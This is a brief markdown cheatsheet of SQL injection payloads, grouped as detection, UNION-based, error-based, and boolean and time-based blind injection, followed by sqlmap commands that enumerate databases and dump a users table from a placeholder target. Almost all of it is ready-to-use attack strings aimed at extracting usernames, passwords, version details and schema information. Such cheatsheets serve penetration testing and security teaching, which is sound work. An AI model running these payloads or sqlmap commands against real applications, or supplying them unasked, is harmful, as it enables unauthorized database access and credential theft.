# SQL Injection Cheatsheet

## Detection
```
' OR '1'='1
' OR '1'='1'--
' UNION SELECT NULL--
' AND 1=1--
' AND 1=2--
```

## UNION-Based
```sql
' UNION SELECT 1,2,3--
' UNION SELECT username,password FROM users--
' UNION SELECT table_name,NULL FROM information_schema.tables--
```

## Error-Based
```sql
' AND extractvalue(1,concat(0x7e,(SELECT version())))--
' AND updatexml(1,concat(0x7e,(SELECT user())),1)--
```

## Blind (Boolean)
```sql
' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--
```

## Blind (Time)
```sql
' AND IF(1=1,SLEEP(5),0)--
' AND IF((SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a',SLEEP(5),0)--
```

## SQLMap
```bash
sqlmap -u "http://target.com/page?id=1" --dbs
sqlmap -u "http://target.com/page?id=1" -D dbname --tables
sqlmap -u "http://target.com/page?id=1" -D dbname -T users --dump
```

> Reference: https://portswigger.net/web-security/sql-injection/cheat-sheet